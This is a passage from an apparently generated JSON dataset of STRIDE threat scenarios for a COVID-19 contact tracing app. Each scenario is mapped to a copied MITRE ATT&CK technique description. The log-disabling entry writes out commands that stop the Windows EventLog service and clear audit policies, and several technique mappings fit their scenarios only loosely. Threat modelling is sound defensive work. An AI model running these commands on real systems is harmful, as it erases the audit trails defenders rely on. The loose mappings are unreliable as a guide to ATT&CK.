Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "A user could falsely deny having been notified about potential COVID-19 exposure.",
            "Assumptions": [
                {
                    "Assumption": "There is no logging mechanism to track notifications and user receipts.",
                    "Role": "System Developer",
                    "Condition": "The current system lacks extensive logging capabilities."
                },
                {
                    "Assumption": "Notification logs can be deleted or altered.",
                    "Role": "User",
                    "Condition": "Users have permissions to modify notification logs."
                },
                {
                    "Assumption": "The app does not enforce non-repudiation mechanisms.",
                    "Role": "System Architect",
                    "Condition": "The design does not include cryptographic proofs of receipt."
                }
            ],
            "Potential Impact": "Disruption in contact tracing reliability, impact on public health response.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "logging",
                "user receipt",
                "non-repudiation"
            ],
            "mitre_technique": {
                "name": "Disable Windows Event Logging",
                "description": "Adversaries may disable Windows event logging to limit data that can be leveraged for detections and audits. Windows event logs record user and system activity such as login attempts, process creation, and much more.(Citation: Windows Log Events) This data is used by security tools and analysts to generate detections.\n\nThe EventLog service maintains event logs from various system components and applications.(Citation: EventLog_Core_Technologies) By default, the service automatically starts when a system powers on. An audit policy, maintained by the Local Security Policy (secpol.msc), defines which system events the EventLog service logs. Security audit policy settings can be changed by running secpol.msc, then navigating to <code>Security Settings\\Local Policies\\Audit Policy</code> for basic audit policy settings or <code>Security Settings\\Advanced Audit Policy Configuration</code> for advanced audit policy settings.(Citation: Audit_Policy_Microsoft)(Citation: Advanced_sec_audit_policy_settings) <code>auditpol.exe</code> may also be used to set audit policies.(Citation: auditpol)\n\nAdversaries may target system-wide logging or just that of a particular application. For example, the Windows EventLog service may be disabled using the <code>Set-Service -Name EventLog -Status Stopped</code> or <code>sc config eventlog start=disabled</code> commands (followed by manually stopping the service using <code>Stop-Service  -Name EventLog</code>).(Citation: Disable_Win_Event_Logging)(Citation: disable_win_evt_logging) Additionally, the service may be disabled by modifying the \u201cStart\u201d value in <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\EventLog</code> then restarting the system for the change to take effect.(Citation: disable_win_evt_logging)\n\nThere are several ways to disable the EventLog service via registry key modification. First, without Administrator privileges, adversaries may modify the \"Start\" value in the key <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-Security</code>, then reboot the system to disable the Security EventLog.(Citation: winser19_file_overwrite_bug_twitter) Second, with Administrator privilege, adversaries may modify the same values in <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-System</code> and <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-Application</code> to disable the entire EventLog.(Citation: disable_win_evt_logging)\n\nAdditionally, adversaries may use <code>auditpol</code> and its sub-commands in a command prompt to disable auditing or clear the audit policy. To enable or disable a specified setting or audit category, adversaries may use the <code>/success</code> or <code>/failure</code> parameters. For example, <code>auditpol /set /category:\u201dAccount Logon\u201d /success:disable /failure:disable</code> turns off auditing for the Account Logon category.(Citation: auditpol.exe_STRONTIC)(Citation: T1562.002_redcanaryco) To clear the audit policy, adversaries may run the following lines: <code>auditpol /clear /y</code> or <code>auditpol /remove /allusers</code>.(Citation: T1562.002_redcanaryco)\n\nBy disabling Windows event logging, adversaries can operate while leaving less evidence of a compromise behind.",
                "id": "attack-pattern--4eb28bed-d11a-4641-9863-c2ac017d910a",
                "technique_id": "T1562.002"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "An attacker could deny responsibility for spreading misinformation through in-app communications.",
            "Assumptions": [
                {
                    "Assumption": "The app allows some form of user communication or reporting.",
                    "Role": "System Developer",
                    "Condition": "The app includes peer-to-peer communication features."
                },
                {
                    "Assumption": "Communication logs are either not maintained or can be altered.",
                    "Role": "System Administrator",
                    "Condition": "Log maintenance lacks proper security procedures."
                },
                {
                    "Assumption": "There is no mechanism to authenticate the origin of messages.",
                    "Role": "System Architect",
                    "Condition": "The message system lacks authentication measures."
                }
            ],
            "Potential Impact": "Misinformation spread, impacting the accuracy and reliability of contact tracing.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "misinformation",
                "communication",
                "log alteration"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "A user could deny having consented to data sharing after a COVID-19 positive test result.",
            "Assumptions": [
                {
                    "Assumption": "User consent is not logged or verifiable.",
                    "Role": "System Developer",
                    "Condition": "The system does not implement logging of user actions."
                },
                {
                    "Assumption": "Consent records can be modified or deleted by the user.",
                    "Role": "User",
                    "Condition": "Users have permissions to alter consent records."
                },
                {
                    "Assumption": "The system lacks clear audit trails for user consent activities.",
                    "Role": "System Architect",
                    "Condition": "Audit trails are not part of the system design."
                }
            ],
            "Potential Impact": "Legal repercussions, loss of trust, potential non-compliance with regulations.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "user consent",
                "logging",
                "audit trails"
            ],
            "mitre_technique": {
                "name": "Disable Windows Event Logging",
                "description": "Adversaries may disable Windows event logging to limit data that can be leveraged for detections and audits. Windows event logs record user and system activity such as login attempts, process creation, and much more.(Citation: Windows Log Events) This data is used by security tools and analysts to generate detections.\n\nThe EventLog service maintains event logs from various system components and applications.(Citation: EventLog_Core_Technologies) By default, the service automatically starts when a system powers on. An audit policy, maintained by the Local Security Policy (secpol.msc), defines which system events the EventLog service logs. Security audit policy settings can be changed by running secpol.msc, then navigating to <code>Security Settings\\Local Policies\\Audit Policy</code> for basic audit policy settings or <code>Security Settings\\Advanced Audit Policy Configuration</code> for advanced audit policy settings.(Citation: Audit_Policy_Microsoft)(Citation: Advanced_sec_audit_policy_settings) <code>auditpol.exe</code> may also be used to set audit policies.(Citation: auditpol)\n\nAdversaries may target system-wide logging or just that of a particular application. For example, the Windows EventLog service may be disabled using the <code>Set-Service -Name EventLog -Status Stopped</code> or <code>sc config eventlog start=disabled</code> commands (followed by manually stopping the service using <code>Stop-Service  -Name EventLog</code>).(Citation: Disable_Win_Event_Logging)(Citation: disable_win_evt_logging) Additionally, the service may be disabled by modifying the \u201cStart\u201d value in <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\EventLog</code> then restarting the system for the change to take effect.(Citation: disable_win_evt_logging)\n\nThere are several ways to disable the EventLog service via registry key modification. First, without Administrator privileges, adversaries may modify the \"Start\" value in the key <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-Security</code>, then reboot the system to disable the Security EventLog.(Citation: winser19_file_overwrite_bug_twitter) Second, with Administrator privilege, adversaries may modify the same values in <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-System</code> and <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-Application</code> to disable the entire EventLog.(Citation: disable_win_evt_logging)\n\nAdditionally, adversaries may use <code>auditpol</code> and its sub-commands in a command prompt to disable auditing or clear the audit policy. To enable or disable a specified setting or audit category, adversaries may use the <code>/success</code> or <code>/failure</code> parameters. For example, <code>auditpol /set /category:\u201dAccount Logon\u201d /success:disable /failure:disable</code> turns off auditing for the Account Logon category.(Citation: auditpol.exe_STRONTIC)(Citation: T1562.002_redcanaryco) To clear the audit policy, adversaries may run the following lines: <code>auditpol /clear /y</code> or <code>auditpol /remove /allusers</code>.(Citation: T1562.002_redcanaryco)\n\nBy disabling Windows event logging, adversaries can operate while leaving less evidence of a compromise behind.",
                "id": "attack-pattern--4eb28bed-d11a-4641-9863-c2ac017d910a",
                "technique_id": "T1562.002"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "An attacker could access sensitive proximity data by exploiting vulnerabilities in the mobile application.",
            "Assumptions": [
                {
                    "Assumption": "The app has unpatched vulnerabilities.",
                    "Role": "Attacker",
                    "Condition": "The attacker can exploit known or zero-day vulnerabilities."
                },
                {
                    "Assumption": "Sensitive data is stored insecurely within the app.",
                    "Role": "System Developer",
                    "Condition": "The app does not employ proper encryption for sensitive data."
                },
                {
                    "Assumption": "Data exposure happens due to lack of security controls.",
                    "Role": "System Architect",
                    "Condition": "The system lacks necessary security measures to protect sensitive data."
                }
            ],
            "Potential Impact": "Unauthorized access to sensitive user data.",
            "MITRE ATT&CK Keywords": [
                "information disclosure",
                "vulnerabilities",
                "mobile app",
                "sensitive data"
            ],
            "mitre_technique": {
                "name": "Exploit Public-Facing Application",
                "description": "Adversaries may attempt to exploit a weakness in an Internet-facing host or system to initially access a network. The weakness in the system can be a software bug, a temporary glitch, or a misconfiguration.\n\nExploited applications are often websites/web servers, but can also include databases (like SQL), standard services (like SMB or SSH), network device administration and management protocols (like SNMP and Smart Install), and any other system with Internet accessible open sockets.(Citation: NVD CVE-2016-6662)(Citation: CIS Multiple SMB Vulnerabilities)(Citation: US-CERT TA18-106A Network Infrastructure Devices 2018)(Citation: Cisco Blog Legacy Device Attacks)(Citation: NVD CVE-2014-7169) Depending on the flaw being exploited this may also involve [Exploitation for Defense Evasion](https://attack.mitre.org/techniques/T1211) or [Exploitation for Client Execution](https://attack.mitre.org/techniques/T1203).\n\nIf an application is hosted on cloud-based infrastructure and/or is containerized, then exploiting it may lead to compromise of the underlying instance or container. This can allow an adversary a path to access the cloud or container APIs, exploit container host access via [Escape to Host](https://attack.mitre.org/techniques/T1611), or take advantage of weak identity and access management policies.\n\nAdversaries may also exploit edge network infrastructure and related appliances, specifically targeting devices that do not support robust host-based defenses.(Citation: Mandiant Fortinet Zero Day)(Citation: Wired Russia Cyberwar)\n\nFor websites and databases, the OWASP top 10 and CWE top 25 highlight the most common web-based vulnerabilities.(Citation: OWASP Top 10)(Citation: CWE top 25)",
                "id": "attack-pattern--3f886f2a-874f-4333-b794-aa6075009b1c",
                "technique_id": "T1190"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Network eavesdropping can lead to unauthorized access to data being transmitted between users and servers.",
            "Assumptions": [
                {
                    "Assumption": "Data transmission is not encrypted.",
                    "Role": "System Developer",
                    "Condition": "The system does not utilize secure protocols for data transmission."
                },
                {
                    "Assumption": "The network is susceptible to eavesdropping.",
                    "Role": "Attacker",
                    "Condition": "The attacker can position themselves within the communication path."
                },
                {
                    "Assumption": "Users use public or unsecured networks.",
                    "Role": "User",
                    "Condition": "Users connect to public WiFi without VPNs or other protections."
                }
            ],
            "Potential Impact": "Interception of sensitive data during transmission.",
            "MITRE ATT&CK Keywords": [
                "information disclosure",
                "network",
                "eavesdropping",
                "data transmission"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "An attacker could exploit weak access controls on the central server to access sensitive data.",
            "Assumptions": [
                {
                    "Assumption": "The central server has weak or misconfigured access controls.",
                    "Role": "System Developer",
                    "Condition": "Access control measures are improperly implemented."
                },
                {
                    "Assumption": "Attackers can attempt multiple access methods without detection.",
                    "Role": "Attacker",
                    "Condition": "The system lacks intrusion detection mechanisms."
                },
                {
                    "Assumption": "Sensitive data is stored in plaintext on the server.",
                    "Role": "System Administrator",
                    "Condition": "The server does not encrypt stored data."
                }
            ],
            "Potential Impact": "Unauthorized access to sensitive and personal health data.",
            "MITRE ATT&CK Keywords": [
                "information disclosure",
                "server",
                "access control",
                "sensitive data"
            ],
            "mitre_technique": {
                "name": "External Remote Services",
                "description": "Adversaries may leverage external-facing remote services to initially access and/or persist within a network. Remote services such as VPNs, Citrix, and other access mechanisms allow users to connect to internal enterprise network resources from external locations. There are often remote service gateways that manage connections and credential authentication for these services. Services such as [Windows Remote Management](https://attack.mitre.org/techniques/T1021/006) and [VNC](https://attack.mitre.org/techniques/T1021/005) can also be used externally.(Citation: MacOS VNC software for Remote Desktop)\n\nAccess to [Valid Accounts](https://attack.mitre.org/techniques/T1078) to use the service is often a requirement, which could be obtained through credential pharming or by obtaining the credentials from users after compromising the enterprise network.(Citation: Volexity Virtual Private Keylogging) Access to remote services may be used as a redundant or persistent access mechanism during an operation.\n\nAccess may also be gained through an exposed service that doesn\u2019t require authentication. In containerized environments, this may include an exposed Docker API, Kubernetes API server, kubelet, or web application such as the Kubernetes dashboard.(Citation: Trend Micro Exposed Docker Server)(Citation: Unit 42 Hildegard Malware)",
                "id": "attack-pattern--10d51417-ee35-4589-b1ff-b6df1c334e8d",
                "technique_id": "T1133"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "Attackers could overwhelm the central server with traffic, disrupting the service.",
            "Assumptions": [
                {
                    "Assumption": "The central server cannot properly handle high traffic volumes.",
                    "Role": "System Architect",
                    "Condition": "The server infrastructure lacks auto-scaling or load balancing."
                },
                {
                    "Assumption": "Attackers have the capability to generate large volumes of traffic.",
                    "Role": "Attacker",
                    "Condition": "The attacker can mobilize a botnet or similar tool."
                },
                {
                    "Assumption": "There are no rate-limiting protections in place.",
                    "Role": "System Developer",
                    "Condition": "The application does not implement rate limiting."
                }
            ],
            "Potential Impact": "Disruption of contact tracing and notification services.",
            "MITRE ATT&CK Keywords": [
                "denial of service",
                "traffic",
                "server",
                "service disruption"
            ],
            "mitre_technique": {
                "name": "Direct Network Flood",
                "description": "Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. This DoS attack may also reduce the availability and functionality of the targeted system(s) and network. [Direct Network Flood](https://attack.mitre.org/techniques/T1498/001)s are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.\n\nBotnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)",
                "id": "attack-pattern--0bda01d5-4c1d-4062-8ee2-6872334383c3",
                "technique_id": "T1498.001"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "Flooding Bluetooth communication with false signals to disrupt proximity data collection.",
            "Assumptions": [
                {
                    "Assumption": "Bluetooth communications are not filtered or validated.",
                    "Role": "System Developer",
                    "Condition": "The system lacks mechanisms to validate Bluetooth signals."
                },
                {
                    "Assumption": "The attacker can physically or proximally disrupt Bluetooth signals.",
                    "Role": "Attacker",
                    "Condition": "The attacker is within Bluetooth range of targets."
                },
                {
                    "Assumption": "The app does not have resilience against signal flooding.",
                    "Role": "System Architect",
                    "Condition": "The design does not include anomaly or flood detection."
                }
            ],
            "Potential Impact": "Disruption in the collection of accurate proximity data.",
            "MITRE ATT&CK Keywords": [
                "denial of service",
                "Bluetooth",
                "signal",
                "disruption"
            ],
            "mitre_technique": {
                "name": "Direct Network Flood",
                "description": "Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. This DoS attack may also reduce the availability and functionality of the targeted system(s) and network. [Direct Network Flood](https://attack.mitre.org/techniques/T1498/001)s are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.\n\nBotnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)",
                "id": "attack-pattern--0bda01d5-4c1d-4062-8ee2-6872334383c3",
                "technique_id": "T1498.001"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "Exploiting vulnerabilities in the mobile app to crash the application.",
            "Assumptions": [
                {
                    "Assumption": "The mobile application has exploitable vulnerabilities.",
                    "Role": "Attacker",
                    "Condition": "The attacker can identify and exploit these vulnerabilities."
                },
                {
                    "Assumption": "Users do not update their apps regularly.",
                    "Role": "User",
                    "Condition": "Users fail to install updates that patch vulnerabilities."
                },
                {
                    "Assumption": "The app does not handle unexpected inputs gracefully.",
                    "Role": "System Developer",
                    "Condition": "The application lacks proper input validation."
                }
            ],
            "Potential Impact": "Application crashes leading to interrupted service for users.",
            "MITRE ATT&CK Keywords": [
                "denial of service",
                "mobile app",
                "vulnerabilities",
                "application crash"
            ],
            "mitre_technique": {
                "name": "Application or System Exploitation",
                "description": "Adversaries may exploit software vulnerabilities that can cause an application or system to crash and deny availability to users. (Citation: Sucuri BIND9 August 2015) Some systems may automatically restart critical applications and services when crashes occur, but they can likely be re-exploited to cause a persistent denial of service (DoS) condition.\n\nAdversaries may exploit known or zero-day vulnerabilities to crash applications and/or systems, which may also lead to dependent applications and/or systems to be in a DoS condition. Crashed or restarted applications or systems may also have other effects such as [Data Destruction](https://attack.mitre.org/techniques/T1485), [Firmware Corruption](https://attack.mitre.org/techniques/T1495), [Service Stop](https://attack.mitre.org/techniques/T1489) etc. which may further cause a DoS condition and deny availability to critical information, applications and/or systems. ",
                "id": "attack-pattern--2bee5ffb-7a7a-4119-b1f2-158151b19ac0",
                "technique_id": "T1499.004"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "A compromised user device could escalate privileges to access protected application functionalities.",
            "Assumptions": [
                {
                    "Assumption": "The device has root access enabled.",
                    "Role": "User",
                    "Condition": "The user has rooted or jailbroken their device."
                },
                {
                    "Assumption": "The app does not check for root access during execution.",
                    "Role": "System Developer",
                    "Condition": "The system does not include root detection mechanisms."
                },
                {
                    "Assumption": "The compromised device can bypass normal security checks.",
                    "Role": "Attacker",
                    "Condition": "The attacker has physical or remote control over the device."
                }
            ],
            "Potential Impact": "Unauthorized access to sensitive application functions and data.",
            "MITRE ATT&CK Keywords": [
                "elevation of privilege",
                "compromised device",
                "root access",
                "protected functions"
            ],
            "mitre_technique": {
                "name": "Securityd Memory",
                "description": "An adversary with root access may gather credentials by reading `securityd`\u2019s memory. `securityd` is a service/daemon responsible for implementing security protocols such as encryption and authorization.(Citation: Apple Dev SecurityD) A privileged adversary may be able to scan through `securityd`'s memory to find the correct sequence of keys to decrypt the user\u2019s logon keychain. This may provide the adversary with various plaintext passwords, such as those for users, WiFi, mail, browsers, certificates, secure notes, etc.(Citation: OS X Keychain)(Citation: OSX Keydnap malware)\n\nIn OS X prior to El Capitan, users with root access can read plaintext keychain passwords of logged-in users because Apple\u2019s keychain implementation allows these credentials to be cached so that users are not repeatedly prompted for passwords.(Citation: OS X Keychain)(Citation: External to DA, the OS X Way) Apple\u2019s `securityd` utility takes the user\u2019s logon password, encrypts it with PBKDF2, and stores this master key in memory. Apple also uses a set of keys and algorithms to encrypt the user\u2019s password, but once the master key is found, an adversary need only iterate over the other values to unlock the final password.(Citation: OS X Keychain)",
                "id": "attack-pattern--1a80d097-54df-41d8-9d33-34e755ec5e72",
                "technique_id": "T1555.002"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "Exploiting vulnerabilities in the server to gain administrative privileges.",
            "Assumptions": [
                {
                    "Assumption": "Server software contains exploitable vulnerabilities.",
                    "Role": "System Developer",
                    "Condition": "There are known or unknown vulnerabilities in the server software."
                },
                {
                    "Assumption": "There is inadequate monitoring and logging of server activities.",
                    "Role": "System Administrator",
                    "Condition": "The server lacks effective security monitoring."
                },
                {
                    "Assumption": "Remote access to the server is possible without strong authentication.",
                    "Role": "Attacker",
                    "Condition": "The attacker can remotely access the server via weak or no authentication."
                }
            ],
            "Potential Impact": "Unauthorized changes to server configurations and sensitive data.",
            "MITRE ATT&CK Keywords": [
                "elevation of privilege",
                "server",
                "vulnerabilities",
                "administrative access"
            ],
            "mitre_technique": {
                "name": "External Remote Services",
                "description": "Adversaries may leverage external-facing remote services to initially access and/or persist within a network. Remote services such as VPNs, Citrix, and other access mechanisms allow users to connect to internal enterprise network resources from external locations. There are often remote service gateways that manage connections and credential authentication for these services. Services such as [Windows Remote Management](https://attack.mitre.org/techniques/T1021/006) and [VNC](https://attack.mitre.org/techniques/T1021/005) can also be used externally.(Citation: MacOS VNC software for Remote Desktop)\n\nAccess to [Valid Accounts](https://attack.mitre.org/techniques/T1078) to use the service is often a requirement, which could be obtained through credential pharming or by obtaining the credentials from users after compromising the enterprise network.(Citation: Volexity Virtual Private Keylogging) Access to remote services may be used as a redundant or persistent access mechanism during an operation.\n\nAccess may also be gained through an exposed service that doesn\u2019t require authentication. In containerized environments, this may include an exposed Docker API, Kubernetes API server, kubelet, or web application such as the Kubernetes dashboard.(Citation: Trend Micro Exposed Docker Server)(Citation: Unit 42 Hildegard Malware)",
                "id": "attack-pattern--10d51417-ee35-4589-b1ff-b6df1c334e8d",
                "technique_id": "T1133"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "Malicious updates could be used to run privileged code on user devices.",
            "Assumptions": [
                {
                    "Assumption": "Update process does not verify code integrity.",
                    "Role": "System Developer",
                    "Condition": "There is no verification of code integrity during updates."
                },
                {
                    "Assumption": "The attacker can compromise the update distribution channel.",
                    "Role": "Attacker",
                    "Condition": "Security measures for update distribution are insufficient."
                },
                {
                    "Assumption": "The app runs with high privileges on the user device.",
                    "Role": "System Developer",
                    "Condition": "The app requires high privileges for normal operation."
                }
            ],
            "Potential Impact": "Execution of malicious code with elevated privileges, compromising device security.",
            "MITRE ATT&CK Keywords": [
                "elevation of privilege",
                "updates",
                "code integrity",
                "privileged code"
            ],
            "mitre_technique": {
                "name": "Launch Daemon",
                "description": "Adversaries may create or modify Launch Daemons to execute malicious payloads as part of persistence. Launch Daemons are plist files used to interact with Launchd, the service management framework used by macOS. Launch Daemons require elevated privileges to install, are executed for every user on a system prior to login, and run in the background without the need for user interaction. During the macOS initialization startup, the launchd process loads the parameters for launch-on-demand system-level daemons from plist files found in <code>/System/Library/LaunchDaemons/</code> and <code>/Library/LaunchDaemons/</code>. Required Launch Daemons parameters include a <code>Label</code> to identify the task, <code>Program</code> to provide a path to the executable, and <code>RunAtLoad</code> to specify when the task is run. Launch Daemons are often used to provide access to shared resources, updates to software, or conduct automation tasks.(Citation: AppleDocs Launch Agent Daemons)(Citation: Methods of Mac Malware Persistence)(Citation: launchd Keywords for plists)\n\nAdversaries may install a Launch Daemon configured to execute at startup by using the <code>RunAtLoad</code> parameter set to <code>true</code> and the <code>Program</code> parameter set to the malicious executable path. The daemon name may be disguised by using a name from a related operating system or benign software (i.e. [Masquerading](https://attack.mitre.org/techniques/T1036)). When the Launch Daemon is executed, the program inherits administrative permissions.(Citation: WireLurker)(Citation: OSX Malware Detection)\n\nAdditionally, system configuration changes (such as the installation of third party package managing software) may cause folders such as <code>usr/local/bin</code> to become globally writeable. So, it is possible for poor configurations to allow an adversary to modify executables referenced by current Launch Daemon's plist files.(Citation: LaunchDaemon Hijacking)(Citation: sentinelone macos persist Jun 2019)",
                "id": "attack-pattern--573ad264-1371-4ae0-8482-d2673b719dba",
                "technique_id": "T1543.004"
            }
        }
    ]
},
{
    "case_number": "10",
    "batch_number": "30",
    "threats": [
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker creates a fake contact tracing app to capture user data.",
            "Assumptions": [
                {
                    "Assumption": "Users can download apps from external sources",
                    "Role": "User",
                    "Condition": "Users download apps from unofficial sources"
                },
                {
                    "Assumption": "No efficient app store verification process",
                    "Role": "App Distributor",
                    "Condition": "Lack of rigorous app vetting process"
                },
                {
                    "Assumption": "The attacker has knowledge about how the legitimate app functions",
                    "Role": "Attacker",
                    "Condition": "The perpetrator analyzes existing apps"
                }
            ],
            "Potential Impact": "Unauthorized access to sensitive health and location data, leading to potential privacy breaches.",
            "MITRE ATT&CK Keywords": [
                "phishing",
                "mobile",
                "data theft"
            ],
            "mitre_technique": {
                "name": "Malicious File",
                "description": "An adversary may rely upon a user opening a malicious file in order to gain execution. Users may be subjected to social engineering to get them to open a file that will lead to code execution. This user action will typically be observed as follow-on behavior from [Spearphishing Attachment](https://attack.mitre.org/techniques/T1566/001). Adversaries may use several types of files that require a user to execute them, including .doc, .pdf, .xls, .rtf, .scr, .exe, .lnk, .pif, and .cpl.\n\nAdversaries may employ various forms of [Masquerading](https://attack.mitre.org/techniques/T1036) and [Obfuscated Files or Information](https://attack.mitre.org/techniques/T1027) to increase the likelihood that a user will open and successfully execute a malicious file. These methods may include using a familiar naming convention and/or password protecting the file and supplying instructions to a user on how to open it.(Citation: Password Protected Word Docs) \n\nWhile [Malicious File](https://attack.mitre.org/techniques/T1204/002) frequently occurs shortly after Initial Access it may occur at other phases of an intrusion, such as when an adversary places a file in a shared directory or on a user's desktop hoping that a user will click on it. This activity may also be seen shortly after [Internal Spearphishing](https://attack.mitre.org/techniques/T1534).",
                "id": "attack-pattern--232b7f21-adf9-4b42-b936-b9d6f7df856e",
                "technique_id": "T1204.002"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker intercepts communications between the mobile app and server, pretending to be a legitimate user.",
            "Assumptions": [
                {
                    "Assumption": "Lack of strong encryption",
                    "Role": "App Developer",
                    "Condition": "Communication channels are not properly encrypted"
                },
                {
                    "Assumption": "User devices are vulnerable to man-in-the-middle attacks",
                    "Role": "User",
                    "Condition": "Devices use unsecured networks"
                },
                {
                    "Assumption": "An attacker has access to the network path between users and the server",
                    "Role": "Attacker",
                    "Condition": "The attacker can control or monitor network traffic"
                }
            ],
